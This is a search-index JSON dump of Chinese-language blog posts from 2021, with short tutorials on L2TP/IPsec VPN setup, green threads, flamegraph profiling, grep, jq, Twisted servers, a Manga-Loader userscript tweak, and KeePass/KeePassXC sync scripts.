App.\n","categories":["Windows","Tips"]},{"title":"在windows10不安裝軟體使用vpngate","url":"/2021/05/l2tp-ipsec-vpn-on-windows10/","content":"動機\nvpngate很方便，但每次都要安裝軟體他的軟體就很煩，openvpn也要安裝，不過幸好有l2tp，一般來說OS都有提供l2tp+ipsec的client。\n這代表我們可以直接用，不用裝任何東西!!\n\n步驟\n\n\n到官網挑一個喜歡的server address(螢光筆的部分)，要有l2tp\n\n\n\n到新增vpn的部分，選使用L2TP/IPsec(使用預先共用金鑰)，之後都填vpn\n\n\n\ncaveat\n\n在linux如果是用networkmanager-l2tp設定起來要多一點步驟，不然ipsec不會動 (以後補)\n不是所有server都有l2tp，不然就只能用sstp或是openvpn\n\n","categories":["Windows","Tips"]},{"title":"在openwrt上配置l2tp ipsec vpn server","url":"/2021/05/setup-l2tp-ipsec-vpn-server-on-openwrt/","content":"動機\n紀錄設定openwrt上的l2tp+ipsec server，之前找到的都只有l2tp的部分，所以記錄一下\n\nipsec.conf\nconfig setup        dumpdir=/var/run/pluto        nat_traversal=yes        oe=off        protostack=netkeyconn myvpn                   auto=add            authby=secret        ike=aes256-sha1;modp1024!        phase2alg=aes256-sha1;modp1024        pfs=no        type=transport        left=&#123;&#123;your public ip&#125;&#125;        leftprotoport=17/1701        right=%any        rightprotoport=17/%any        rekey=no        keyingtries=5\nxl2tpd.conf\n[global]debug avp=nodebug network=nodebug packet=nodebug state=nodebug tunnel=no[lns default];exclusive = yesip range = 192.168.254.202-192.168.254.210lac = 10.0.1.2local ip = 192.168.254.200length bit = yesrefuse authentication = yesppp debug = yespppoptfile = /etc/ppp/options.xl2tpd\noptions.xl2tpd\nnoauthdebugdumplogfd 2logfile /var/log/xl2tpd.logmtu 1400mru 1400ms-dns 192.168.254.200lcp-echo-failure 12lcp-echo-interval 5require-mschap-v2nomppe\nchap-secrets\n#USERNAME  PROVIDER  PASSWORD  IPADDRESShi * hi *","categories":["Network","Tips"]},{"title":"Green Threads Explained筆記","url":"/2021/06/Green-Threads-Explained-note/","content":"動機\n偶然找到Green Threads Explained很讚，做點筆記\n\nthread要有?\n\nscheduler\n\n因為要schedule，所以要context switch\n\ncontext switch要換的是當下執行的狀態，所以要看\n\narch(x86, amd64, arm)的ABI\narch的reg\n\n\n\n\n\n\n\n實作?\n這裡就看我覺得重要的地方\nstruct gt\nthread的狀態，兩件事\n\n紀錄當下執行的狀態，或是說在cpu運算會用到的reg\n\n\nreg其實可以當成cpu的狀態\n同理，可以把這個概念推廣成在一般自己的function會用到的參數都是function的狀態\n\n\nthread的狀態\n\nstruct gt &#123;    struct gtctx &#123;        uint64_t rsp; //  Stack pointer for top address of the stack        uint64_t r15; // I dont know        uint64_t r14;        uint64_t r13;        uint64_t r12;        uint64_t rbx; // Base index (for use with arrays)        uint64_t rbp; // Stack base pointer for holding the address of the current stack frame.    &#125; ctx;    enum &#123;        Unused,         Running,        Ready, // has rest of works    &#125; st;&#125;;\ncontext switch\n這要同時看gtgo與gtswtch\ngtgo負責\n\n設給cpu用的stack，這\n對pc(program counter)動手腳\n\n\n我們沒辦法直接改pc，所以要利用stack動手腳\n\nstack第一層放gtstop，第二層放f\n第二層會在gtswtch(context switch)的ret，被拿出來跑到f去\nstack第一層會在f直接call時利用到，return就直接到gtstop\n\n\n\n*(uint64_t *)&amp;stack[StackSize -  8] = (uint64_t)gtstop;*(uint64_t *)&amp;stack[StackSize - 16] = (uint64_t)f;p-&gt;ctx.rsp = (uint64_t)&amp;stack[StackSize - 16];\ngtswtch就是把reg存起來，但問題是從哪到哪?\n怎麼看old與new?\n\n看gtswtch怎麼被call的\n\n\ngtswtch(old, new);\n\n\narch的ABI\n\n\nABI會說，reg要怎麼用，像function的參數要怎麼帶\n這裡rdi是第一個參數，rsi是第二個參數\n\ngtswtch:        mov     %rsp, 0x00(%rdi)        mov     %r15, 0x08(%rdi)        mov     %r14, 0x10(%rdi)        mov     %r13, 0x18(%rdi)        mov     %r12, 0x20(%rdi)        mov     %rbx, 0x28(%rdi)        mov     %rbp, 0x30(%rdi)        mov     0x00(%rsi), %rsp        mov     0x08(%rsi), %r15        mov     0x10(%rsi), %r14        mov     0x18(%rsi), %r13        mov     0x20(%rsi), %r12        mov     0x28(%rsi), %rbx        mov     0x30(%rsi), %rbp        ret\n整體邏輯\n一個array去放thread，之後在yield被call時，換(這裡用RR去選)到下一個thread\nGoroutines\nGoroutines也是cooperative thread，與Green Threads Explained一樣，但感覺怪怪的?\nGoroutines沒有yield\nyield是runtime叫的\n\n\nChannel send and receive operations, if those operations would block.\nThe Go statement, although there is no guarantee that new goroutine will be scheduled immediately.\nBlocking syscalls like file and network operations.\nAfter being stopped for a garbage collection cycle.\n\n\nsyscall不會block其他threadㄟ\n所以go會把出事的thread放到其他OS thread去跑，畢竟syscall會block\n這也是Goroutines要分成下面三個的理由\n\nG (green thread)\nM (OS thread，真正做事的)\nP (運行G的context)\n\n如果G發syscall就會讓M被卡，所以需要P讓其他G可以避難到其他M去\n\nGoroutines的context switch比較快?\ngo只保留需要的reg\n\nsince it is invoked implicitly in the code e.g. during sleep or channel wait, the compile only needs to safe/restore the registers which are alive at these points.\nIn Go, this means only 3 registers i.e. PC, SP and DX (Data Registers) being updated during context switch rather than all registers\n\nRef\nThe Go scheduler\nWhy goroutines are not lightweight threads?\n","categories":["C++","Reading"]},{"title":"flamegraph筆記","url":"/2021/06/flamegraph-tutorial/","content":"動機\n\nperf\nperf是linux2.6之後就內建的工具，可以對cpu採樣\nperf會對cpu抽樣，去看現在cpu上的proc是什麼\nperf record -F &lt;how-many-times-should-perf-probe&gt; -e &lt;which-event-want-to-trace&gt; -p &lt;pid&gt; -g -- sleep &lt;how-long-does-perf-keep-profiling&gt;\n在linux上採樣還有ebpf可以用，但是最好是在4.10之後的版本用\n之後透過其他工具整理成flamegraph\nflamegraph\n\nx軸\n\n沒有什麼意義，因為重點是stack\n\n但chrome的devtools是時間，所以會變成現在這時間點上有什麼stack\n\n\n\n\ny軸\n\nstack的深度\n最上面就是正在跑的function\n從底往上長\n\n\n顏色\n\n沒有什麼意義\n但也可以讓他表示不同的東西，分別用不同的顏色\n\n來源: jvm, c++, kernel…\ncycle/inst的比重: 看是cycle多(stall)，或是都在跑inst\n\n\n\n\n點 =&gt; 長方形\n\n就是function在stack中的佔比\n所以可以換perf的事件，看在stack中發生的佔比!!\n\n\n除了追花費時間\n\ncxt switch\n\n找blocked proc\n\n\npage fault\n\n找誰在要mem\n\n\ndisk io req\n\n找用disk的\n\n\ncpu + off-cpu\n\ncpu就是原本誰在跑的flamegraph\noff-cpu就是看誰睡著的flamegraph\nebpf可以把兩個和在一起，看\n\n睡著的理由\n睡覺時誰在做事\n\n\n\n\n還可以追tcp event, CPU cache miss(LLC-loads)\n\n\n\n常見問題\n一般profiler都透過下面兩個東西去走\n\nstack pointer frame(或DWARF)\nsymbol table\n\n\nstack frame pointer\n\ncompiler優化會把frame ptr當成一般來用\n\n解法\n\n關掉\n改用DWARF\n用JIT runtime walker?\n\n這樣看不到kernel\n\n\n\n\n\n\n\n\ninline\n\nstack frame會消失\n解法\n\n關掉\n\n別，很可怕\n\n\n限制inline的size (java可以，C能嗎?)\nruntime支援可選的un-inline (java可以，C能嗎?)\n\n\n\n\nperf的stack depth限制\n\n預設127\nlinux4.8之後可以改\n\n\ndebug symbol\n\n沒symbol就傻眼\n解法\n\n找有dbgsym的同名package裝\n自己編有debug symbol的\n\n注意到優化等級，有時候優化會把symbol丟了\n\n可以用針對debug的優化，-Og\n\n\n\n\nJIT要由runtime生(java的perf-map-agent)\n\n\n\n\ncode跑在container上\n\n進不去怎麼perf\n解法\n\ncopy出來需要的東西出來\nlinux4.13的improve\n\n\n\n\n\nRef\nBrendan Gregg大大的slide 十分明瞭一定要看\nBrendan Gregg的flamegraphs blog有實例\n","categories":["System","Performance"]},{"title":"git一次推所有branch","url":"/2021/06/git-push-all-branches/","content":"動機\n一個一個推branch真的很累\n\n指令\ngit push --all origin\n如果要預設push時都推所有branch\ngit push --all origin-u\n","categories":["Utils","Git"]},{"title":"grep常用整理","url":"/2021/06/grep-tips/","content":"動機\n整理常用的grep\n\nmatch\n一般都是用regex去match一部分的字\n\npat當成字串: grep -F\n\n可以當成notepad的Ctrl+F\n\n\nregex不想加backslash: egrep\n忽略大小寫: grep -i\n整行要match: grep -x,--line-regexp\n只match看單字: grep -w, --word-regexp\n\n像pat給test\n\ntestfrd不會match\n,test’會match，因為有符號隔開\n\n\n\n\n\nshow\n\n前i行，後j行都要看: grep -A i -B j\n前後各k行: grep -C k\n只印沒match的: grep -v\n印行號: grep -n\n印檔名: grep -H\n\n不印: -h\n\n\n不要印任何東西: grep -q\n\n通常用在if作條件判斷的時候\n\n\n\nsearch\n\n不要match binary: grep -I\n找所有資料夾的所有檔案: grep -r\n\n-R也是遞迴，但會follow symbol link\n找code在哪個檔案: grep -Irn\n\n\n\nstream\n\n如果對面是stream: grep --line-buffered\n\n像是log有很多東西混在一起的話\n\ntail -f /var/log/some.log | grep --line-buffered &quot;srv-name&quot;\n\n\n\n\n\n","categories":["Utils","Bash"]},{"title":"改Manga-Loader的心得與一些方法","url":"/2021/06/hack-Manga-Loader/","content":"動機\nmanga loader是神器，來試著加加新的網站\n\n第一次: 從範例找使用方法\n因為要加的是新網站，所以要先知道怎麼帶domain\n先找有沒有domain，就會看到像下面\n&#123;  name: &#x27;geh-and-exh&#x27;,  match: &quot;^https?://(e-hentai|exhentai).org/s/.*/.*&quot;,  img: &#x27;.sni &gt; a &gt; img, #img&#x27;,  next: &#x27;.sni &gt; a, #i3 a&#x27;,  numpages: &#x27;div.sn &gt; div &gt; span:nth-child(2)&#x27;,  curpage: &#x27;div.sn &gt; div &gt; span:nth-child(1)&#x27;&#125;\n之後很幸運，有註解\nSample Implementation:&#123;    name: &#x27;something&#x27; // name of the implementation  , match: &quot;^https?://domain.com/.*&quot; // the url to react to for manga loading  , img: &#x27;#image&#x27; // css selector to get the page&#x27;s manga image  , next: &#x27;#next_page&#x27; // css selector to get the link to the next page  , numpages: &#x27;#page_select&#x27; // css selector to get the number of pages. elements like (select, span, etc)  , curpage: &#x27;#page_select&#x27; // css selector to get the current page. usually the same as numPages if it&#x27;s a select element  , numchaps: &#x27;#chapters&#x27; // css selector to get the number of chapters in manga  , curchap: &#x27;#chapters&#x27; // css selector to get the number of the current chapter  , nextchap: &#x27;#next_chap&#x27; // css selector to get the link to the next chapter  , prevchap: &#x27;#prev_chap&#x27; // same as above except for previous  , wait: 3000 // how many ms to wait before auto loading (to wait for elements to load), or a css selector to keep trying until it returns an elem  , pages: function(next_url, current_page_number, callback, extract_function) &#123;    // gets called requesting a certain page number (current_page_number)    // to continue loading execute callback with img to append as first parameter and next url as second parameter    // only really needs to be used on sites that have really unusual ways of loading images or depend on javascript  &#125;  Any of the CSS selectors can be functions instead that return the desired value.&#125;\n所以看來只要帶css selector就好，雖然有看到其他範例是帶function，但這一次用不到所以放著\n第二次: tracing javascript is painful\n到了這回，同一個頁面居然有多個圖片!!\n所以要trace裡面怎麼做的，從使用的地方開始會去找，這次要找function的範例\n除了pages之外，function都只吃ctx，看了裡面的用法，ctx因該是dom\n在看pages，有4個參數，之前的註解有說大概是什麼，但不清楚也看不懂\n所以要回去看怎麼被call，\nif (imp.pages) &#123;  imp.pages(url, curPage, addAndLoad, ex, getPageInfo);&#125; else &#123;  var colonIdx = url.indexOf(&#x27;:&#x27;);  if(colonIdx &gt; -1) &#123;    url = location.protocol + url.slice(colonIdx + 1);  &#125;  xhr.open(&#x27;get&#x27;, url);  imp.beforexhr &amp;&amp; imp.beforexhr(xhr);  xhr.onload = getPageInfo;  xhr.onerror = function() &#123;    log(&#x27;failed to load page, aborting&#x27;, &#x27;error&#x27;);  &#125;;  xhr.send();&#125;\n如果有給pages就call沒有就xhr，再去看onload\ngetPageInfo = function() &#123;  var page = d.body;  d.body.innerHTML = xhr.response;  try &#123;    // find image and link to next page    addAndLoad(ex(&#x27;img&#x27;, imp.imgmod, page), ex(&#x27;next&#x27;, null, page));  &#125; catch (e) &#123;    if (xhr.status == 503 &amp;&amp; retries &gt; 0) &#123;      log(&#x27;xhr status &#x27; + xhr.status + &#x27; retrieving &#x27; + xhr.responseURL + &#x27;, &#x27; + retries-- + &#x27; retries remaining&#x27;);      window.setTimeout(function() &#123;        xhr.open(&#x27;get&#x27;, xhr.responseURL);        xhr.send();      &#125;, 500);    &#125; else &#123;      log(e);      log(&#x27;error getting details from next page, assuming end of chapter.&#x27;);    &#125;  &#125;&#125;\nres往addAndLoad灌\naddAndLoad = function(img, next) &#123;  if(!img) throw new Error(&#x27;failed to retrieve img for page &#x27; + curPage);  updateStats();  addImage(img, UI.images, curPage, function() &#123;          pagesLoaded += 1;          updateStats();  &#125;);      if(!next &amp;&amp; curPage &lt; numPages) throw new Error(&#x27;failed to retrieve next url for page &#x27; + curPage);      loadNextPage(next);&#125;\n這邊的問題是img與next是什麼，如果有type應該就不會這麼麻煩了\n他們是dom還是url，所以還要往下看，但不想再貼code，直接據透，是url\n處理完type，再來是看到了只能一張圖的理由，加一張圖就下一頁，所以這邊要改，多一個flag去擋\naddAndLoad = function(img, next, inc_page=true) &#123;  if(!img) throw new Error(&#x27;failed to retrieve img for page &#x27; + curPage);  updateStats();  addImage(img, UI.images, curPage, function() &#123;      if (inc_page) &#123;          pagesLoaded += 1;          updateStats();      &#125;  &#125;);  if (inc_page) &#123;      if(!next &amp;&amp; curPage &lt; numPages) throw new Error(&#x27;failed to retrieve next url for page &#x27; + curPage);      loadNextPage(next);  &#125;&#125;\n之後把addAndLoad與pages的知識加起來，所以要自己寫個pages大概像\n\n發xhr\n把所有img拉出來\n用addImage塞圖\n最後一個再把flag丟回去\n\nvar getPageInfo2 = function(xhr,addAndLoad, img_css, next_css) &#123;    return function() &#123;        var ctx = document.implementation.createHTMLDocument();        ctx.body.innerHTML = xhr.response;        try &#123;            // find image and link to next page            var nextUrl = getEl(next_css, ctx).href;            var imgs = getEls(img_css, ctx).map(function(page) &#123; return page.src; &#125;);            for(let i=0;i&lt;imgs.length-1;i++) &#123;                addAndLoad(imgs[i],&#x27;whatever&#x27;,false);            &#125;            addAndLoad(imgs[imgs.length-1],nextUrl,true);        &#125; catch (e) &#123;            if (xhr.status == 503 &amp;&amp; retries &gt; 0) &#123;                log(&#x27;xhr status &#x27; + xhr.status + &#x27; retrieving &#x27; + xhr.responseURL + &#x27;, &#x27; + retries-- + &#x27; retries remaining&#x27;);                window.setTimeout(function() &#123;                    xhr.open(&#x27;get&#x27;, xhr.responseURL);                    xhr.send();                &#125;, 500);            &#125; else &#123;                log(e);                log(&#x27;error getting details from next page, assuming end of chapter.&#x27;);            &#125;        &#125;    &#125;;&#125;;&#123;    name: &#x27;taotu55&#x27;,    match: &quot;^https?://www.taotu55.net/w/.*/.*&quot;,    img: &#x27;body &gt; div.bcen &gt; div:nth-child(1) &gt; div.content &gt; img&#x27;,    next: &#x27;body &gt; div.bcen &gt; div:nth-child(2) &gt; div.NewPages &gt; ul &gt; li:last-child &gt; a&#x27;,    numpages: function(ctx) &#123;        var last = getEl(&#x27;body &gt; div.bcen &gt; div:nth-child(2) &gt; div.NewPages &gt; ul &gt; li:nth-last-child(1) &gt; a&#x27;,ctx).text;        if (!isNaN(last)) &#123;            return parseInt(last,10);        &#125; else &#123;            return parseInt(getEl(&#x27;body &gt; div.bcen &gt; div:nth-child(2) &gt; div.NewPages &gt; ul &gt; li:nth-last-child(2) &gt; a&#x27;,ctx).text, 10);        &#125;    &#125;,    pages: function(url, num, cb, ex,idontcare,ctx) &#123;        var colonIdx = url.indexOf(&#x27;:&#x27;);        var xhr = new XMLHttpRequest();        if(colonIdx &gt; -1) &#123;            url = location.protocol + url.slice(colonIdx + 1);        &#125;        xhr.open(&#x27;get&#x27;, url);        xhr.onload = getPageInfo2(xhr,cb, this.img, this.next);        xhr.onerror = function() &#123;            log(&#x27;failed to load page, aborting&#x27;, &#x27;error&#x27;);        &#125;;        xhr.send();    &#125;,    curpage: &#x27;body &gt; div.bcen &gt; div:nth-child(2) &gt; div.NewPages &gt; ul &gt; li.thisclass &gt; a&#x27;&#125;\n心得\n\n要抱著問題去追，不然會被雜訊干擾\n一定要搞懂每個變數實際時的東西(type)\n最後一定要能夠知道每個變數是怎麼關聯，為什麼是這個type，他們是怎麼完成要處理的問題(目的)\n之後確定(堅定)好自己怎麼做，從之前看的知識組合解法，不然就是回去重新找哪邊有自己需要的資料(變數)，再釐清新的架構\n從起點到終點，如果找哪邊有自己需要的資料(變數)時，要先確認與起點(進入點)的距離(怎麼從進入到這裡)，再看終點在哪!!\n\n如果想要改Manga-Loader\n簡單的case可以用css selector來完成，只要給\n\nimg: 圖片\nnext: 連結\nnumpages: 數字\ncurpage: 數字\n\n有點複雜的case可以把上面的selector換成function，至於會餵什麼要去看extractInfo\n主要的function call是\nwaitAndLoad -&gt; loadManga -&gt; addAndLoad -&gt; loadNextPage -&gt; getPageInfo -&gt; addAndLoad ...\n其中最重要的是loadNextPage中會看imp的pages在不在也就是像\n&#123;    name: &#x27;taotu55&#x27;,    match: &quot;^https?://www.taotu55.net/w/.*/.*&quot;,    img: &#x27;body &gt; div.bcen &gt; div:nth-child(1) &gt; div.content &gt; img&#x27;,    next: &#x27;body &gt; div.bcen &gt; div:nth-child(2) &gt; div.NewPages &gt; ul &gt; li:last-child &gt; a&#x27;,    numpages: function(ctx) &#123;        var last = getEl(&#x27;body &gt; div.bcen &gt; div:nth-child(2) &gt; div.NewPages &gt; ul &gt; li:nth-last-child(1) &gt; a&#x27;,ctx).text;        if (!isNaN(last)) &#123;            return parseInt(last,10);        &#125; else &#123;            return parseInt(getEl(&#x27;body &gt; div.bcen &gt; div:nth-child(2) &gt; div.NewPages &gt; ul &gt; li:nth-last-child(2) &gt; a&#x27;,ctx).text, 10);        &#125;    &#125;,    pages: function(url, num, cb, ex,idontcare,ctx) &#123;        // ...    &#125;,    curpage: &#x27;body &gt; div.bcen &gt; div:nth-child(2) &gt; div.NewPages &gt; ul &gt; li.thisclass &gt; a&#x27;&#125;\n就會把調用getPageInfo與addAndLoad交給pages的函數，這樣控制下一頁就是pages來做了，這樣應該可以處理許多case。\n","categories":["Javascript","Small project","Tips"]},{"title":"用twisted迅速架簡單的server","url":"/2021/06/host-simple-server-with-twisted/","content":"動機\n之前工作要架簡單的server去測，但裝一般的server還要設定有的沒的，所以用這個來偷吃步\n\ntwisted\n一個方便寫network programming的framework\n會遇到的理由是之前想架ftp server測試用，但是arch linux的vsftpd架不起來(居然要systemd-homed!?)\n所以找到他，下面是ftp server的範例\nfrom twisted.protocols.ftp import FTPFactory, FTPRealmfrom twisted.cred.portal import Portalfrom twisted.cred.checkers import AllowAnonymousAccess, FilePasswordDBfrom twisted.internet import reactorp = Portal(FTPRealm(&quot;./&quot;), [AllowAnonymousAccess(), FilePasswordDB(&quot;pass.dat&quot;)])f = FTPFactory(p)reactor.listenTCP(21, f)reactor.run()\ncode很短，也很好架，python+code就結束\nhttp server(from官網)\nfrom twisted.web import server, resourcefrom twisted.internet import reactor, endpointsclass Counter(resource.Resource):    isLeaf = True    numberRequests = 0    def render_GET(self, request):        self.numberRequests += 1        request.setHeader(b&quot;content-type&quot;, b&quot;text/plain&quot;)        content = u&quot;I am request #&#123;&#125;\\n&quot;.format(self.numberRequests)        return content.encode(&quot;ascii&quot;)endpoints.serverFromString(reactor, &quot;tcp:8080&quot;).listen(server.Site(Counter()))reactor.run()\n其他還有mail, ssh, reverse-proxy等等\n不過我看不懂要怎麼用，都是用範例去改\n所以我都是需要什麼用twisted what-i-want去找\n範例在source code的docs各個項目中的example\n有教學，Twisted Introduction也有中文的\n怪怪的ftp\n之前把ftp server用好後，無法重現ftp傳檔的bug，但是vsftpd可以，十分的詭異\nbug是連vpn用ftp經過router過一段時間就會停止傳輸最後timeout，但是用twisted的http server可以重現\nngrok\n方便建https，不然要自己用public ip與reverse proxy與ssl證書(好麻煩)，ngrok只要三步就搞定了\n\n載ngrok的執行檔\n辦帳號拿token\n./ngrok authtoken your-token登入\n./ngrok proto port\n\n\nproto支援http, tls, tcp\nport就是server的port\n\n\n之後terminal就會顯示網址，就可以連以及有https\n\n","categories":["Python","Tips"]},{"title":"jq使用筆記","url":"/2021/06/jq-tutorial/","content":"動機\n在bash想處理json的好工具\n\nbasic\n\n.就是目前的input\n.&lt;name&gt;會取對應key的value\n&#123;obj&#125;[0]這是取array的第零項\n&#123;obj&#125;[i:j]這是slice第i項到第j-1項的array\n&#123;obj&#125;[]會iterate所有項目\n\narray就是每個item\nobj就是無視key，把每個value走過一次\n\n\n[&lt;expr&gt;] &#123;&lt;expr&gt;&#125;分別做出array與json object\n&lt;expr0&gt; | &lt;expr&gt; as $var | &lt;expr2&gt;設定$var成&lt;expr&gt;的值，pipe後面的點是&lt;expr0&gt;的值\n\n例子\n假設我們想把\n[    &#123;      &quot;name&quot;:&quot;Test Value&quot;,      &quot;timer&quot;:[          &#123; &quot;datetime&quot;:&quot;08/30/2017 16:33:35&quot;, &quot;value&quot;:&quot;625&quot; &#125;,          &#123; &quot;datetime&quot;:&quot;08/30/2017 16:22:38&quot;, &quot;value&quot;:&quot;240&quot; &#125;      ]    &#125;,    &#123;      &quot;name&quot;:&quot;Test Value 2&quot;,      &quot;timer&quot;:[          &#123; &quot;datetime&quot;:&quot;08/30/2017 16:07:38&quot;, &quot;value&quot;:&quot;432&quot; &#125;,          &#123; &quot;datetime&quot;:&quot;08/30/2017 15:59:07&quot;, &quot;value&quot;:&quot;1355&quot; &#125;      ]    &#125;]\n變成\n[  [    &quot;Test Value&quot;,    &quot;08/30/2017 16:33:35&quot;  ],  [    &quot;Test Value&quot;,    &quot;08/30/2017 16:22:38&quot;  ]][  [    &quot;Test Value 2&quot;,    &quot;08/30/2017 16:07:38&quot;  ],  [    &quot;Test Value 2&quot;,    &quot;08/30/2017 15:59:07&quot;  ]]\n所以要做的是\n\n拿name\niterate每個timer去拿datetime\ndatetime與name組在一起\n\n下面一步一步的code\n\n.[]\n\n先走每個值\n\n\n.[] | .name as $name\n\n取name\n\n\n.[] | .name as $name | .timer[]\n\n取timer走每個值\n\n\n.[] | .name as $name | .timer[] | .datetime\n\n取timer走每個值\n\n\n.[] | .name as $name | .timer[] | [$name, .datetime]\n\n把tiemr與datetime合起來\n\n\n.[] | .name as $name | [.timer[] | [$name, .datetime]]\n\n最後把timer的loop包起來\n\n\n\n這個例子因為把不同level的資料和在一起，所以要變數把不同level的東西存好\n才有辦法在後面需要時去用\n所以怎麼看jq的咒語?\n\n順著原本的json架構去看\n分pipe去看現在的.是誰\n遇到建構array或obj的部分要對好原本json的位置去看裡面是在建構什麼\n\nfaltten\n如果要把\n[  [    &quot;Test Value&quot;,    &quot;08/30/2017 16:33:35&quot;  ],  [    &quot;Test Value&quot;,    &quot;08/30/2017 16:22:38&quot;  ]][  [    &quot;Test Value 2&quot;,    &quot;08/30/2017 16:07:38&quot;  ],  [    &quot;Test Value 2&quot;,    &quot;08/30/2017 15:59:07&quot;  ]]\n變成\n[  [    &quot;Test Value&quot;,    &quot;08/30/2017 16:33:35&quot;  ],  [    &quot;Test Value&quot;,    &quot;08/30/2017 16:22:38&quot;  ]  [    &quot;Test Value 2&quot;,    &quot;08/30/2017 16:07:38&quot;  ],  [    &quot;Test Value 2&quot;,    &quot;08/30/2017 15:59:07&quot;  ]]\n可以用faltten\nfaltten(1)\n這樣就能攤平一層\nmap, reduce\n就是map與reduce，不過要注意.代表什麼\n\nmap\n\n括號中的點是array或obj被走到的value\n\n\nreduce\n\n第一個點是整個input\n第二個點是acc(累積的項目)\n\n\n\n把[1,2,3]變成[11,12,13]\njq &#x27;map(.+10)&#x27;jq &#x27;reduce .[] as $i ([]; . += [($i+10)])&#x27;\nelse\njq還能\n\nregex\nif-else\n\n可以判斷type，數字，字母，奇偶\n\n\nwhile\n自訂function與recurse operator\nmath(像三角函數)\n許多builtin function\n\nRef\njq get each value in array with parent\njq Manual\n","categories":["Utils","Bash"]},{"title":"用keepass記密碼","url":"/2021/06/keepass-with-dropbox-cross-devices/","content":"動機\n現在手邊有一堆帳號，總不能都寫下來，所以需要一個管理帳號的方式，同時又要能同步到手機，所以用了keepass\n這篇就是紀錄一下怎麼用\n\n怎麼不是用keepassxc?\n他的同步要裝cloud provider的軟體，我不喜歡，所以就轉到keepass2了\n如果有一天keepassxc也有plugin也許可以試試看\nkeepass2 與 plugin\n\nkeepass2就是一路下一步\nplugin要去官網載，放到C:\\Program Files\\KeePass Password Safe 2\\Plugins\n\n\nKeeAnywhere: 提供連接到cloud provider的手段\nkeepassrpc: 要裝這個才能用browser的外掛\n\n\n啟動keepass2，會載入plugin\n因為我有自己的DB檔，先傳到cloud provider的folder中\n到Tools -&gt; KeeAnywhere Settings中的Add...去加自己的cloud provider\n到File -&gt; Open -&gt; Open from Cloud Drive去開自己的DB檔\n之後只要save都會同步到cloud provider\n\nKee - Password Manager\nKee - Password Manager是我在chrome上用的外掛，幫忙填密碼與記密碼\n記密碼要在登入成功後點他的icon會有個+，點進去後網站與帳密都會帶好，確認沒問題按加入就好\n","categories":["Utils","Keepass"]},{"title":"keepassxc同步db與自動開db","url":"/2021/06/keepassxc-on-windows-10/","content":"動機\nkeepass2真的有點慢，所以換回去keepassxc，同時找一個辦法避免每次開機都要打master key\n所以我把dropbox給裝上去了\n\nwindows\n存master key\n\n先到認證館管理員加master key，雖然說是明碼，但總比直接寫在script上好\n\n\n\n\n\n裝CredentialManager\n\n\nInstall-Module -Name CredentialManager -Scope CurrentUser\n\n\n在powershell就可以用下面的script拿密碼\n\n\n(Get-StoredCredential -Target keepassxc).GetNetworkCredential().password | keepassxc.exe --pw-stdin --keyfile $keyfile_path $dbfile_path --localconfig $localconf_path --config $conf_path\n\n開機時執行\n在startup中放跑指令的捷徑，這捷徑不能用New-Item去生，Value的檢查不會過\n$WshShell = New-Object -comObject WScript.Shell$Shortcut = $WshShell.CreateShortcut(&quot;$home\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\mykeepassxc.lnk&quot;)$Shortcut.TargetPath = &quot;C:\\Windows\\System32\\cmd.exe&quot;$Shortcut.Arguments = &quot;/c start /min `&quot;`&quot; powershell -WindowStyle Hidden -Command `&quot;$home\\MyKeepassXC\\StartCustomKeepass.ps1`&quot;&quot;$Shortcut.IconLocation = &quot;C:\\Program Files\\KeePassXC\\KeePassXC.exe&quot;$Shortcut.save()\nScheduledJob (keepassxc會跑在背景，會看不到)\n\n用管理者權限開powershell\n用下面的script就能在開機時跑指定的腳本\n\n$trigger = New-JobTrigger -AtStartupRegister-ScheduledJob -Trigger $trigger -FilePath $home\\MyKeepassXC\\StartCustomKeepass.ps1 -Name StartCustomKeepass\n設定hardlink\n這裡是把local的config與dropbox的連在一起，只要改了設定就能同步到其他台\nfunction Set-ConfAsHardLink &#123;    param (        [string]$HostPath,        [string]$CloudPath    )    if(!(Test-Path -Path $HostPath)) &#123;        New-Item -ItemType HardLink -Path $HostPath -Value $CloudPath    &#125; elseif(!(Get-ItemProperty $HostPath).LinkType -eq &quot;HardLink&quot;) &#123;        Remove-Item $HostPath        New-Item -ItemType HardLink -Path $HostPath -Value $CloudPath    &#125;&#125;Set-ConfAsHardLink -HostPath &quot;$home\\AppData\\Local\\KeePassXC\\keepassxc.ini&quot; -CloudPath $localconf_pathSet-ConfAsHardLink -HostPath &quot;$home\\AppData\\Roaming\\KeePassXC\\keepassxc.ini&quot; -CloudPath $conf_path\npowershell試用感想\n把指令存成string\n整體操作起來很像物件，但是還是有不順手的地方，像keepassxc.exe因為沒有加到PATH所以要放絕對路徑\n但是，直接用環境變數湊出來的路徑會有space!!\n不會自己跳掉，所以沒辦法直接放到變數這個時候要用Invoke-expression\n然而，Invoke-expression前面接pipe，跑出來個結果不對，但是把pipe包到整個Invoke-expression又很長\n所以就變成不存變數直接展開了，原本以為所有指令都可以當成一級函數亂丟，結果不行\nsudo\npowershell沒有sudo，有人寫，但要裝\n可以用runas，但是會彈出另一個視窗，不適合script去跑\n對一個bash用習慣的人來說真的不習慣\n物件\n指令跑完可以像物件一樣存取，函數也是用named args，十分人性化，這點一定要給好評\n還有居然可以在script看到type!! 這真的太贊了\nlinux(ubuntu)\n存master key\n\n用keyring\n\n開機時執行\n\n加下面的內容到.config/autostart/StartCustomKeepass.sh.desktop，沒有folder自己建\n\n[Desktop Entry]Type=ApplicationExec=$HOME/MyKeepassXC/StartCustomKeepass.shHidden=falseNoDisplay=falseX-GNOME-Autostart-enabled=trueName[en_US]=keepassxcName=keepassxcComment[en_US]=Comment=\n難搞的systemd\nsystemd可以管理proc的生存狀態，但是我真的用不起來，一個是所有指令要用絕對路徑\n另一個最重要的是，我的keyring或是secret-tool在systemd中都拿不到密碼，這應該與keyring的實現機制有關，之後再看看\n設定hardlink\nlinux沒有指令可以區分hardlink與一般file，只能用inode的編號\nSet_ConfAsHardLink() &#123;    hostPath=$1    cloudPath=$2    if [ ! -f $hostPath ];    then\t    ln $cloudPath $hostPath    else\thostInode=$(ls -i $hostPath | awk &#x27;&#123;print $1 &#125;&#x27;)\tcloudInode=$(ls -i $cloudPath | awk &#x27;&#123;print $1 &#125;&#x27;)\tif [ $hostInode -eq $cloudInode ];\tthen\t    rm $hostPath\t    ln $cloudPath $hostPath\tfi    fi&#125;Set_ConfAsHardLink $host_localconf_path $localconf_pathSet_ConfAsHardLink &quot;$HOME/.config/keepassxc/keepassxc.ini&quot; 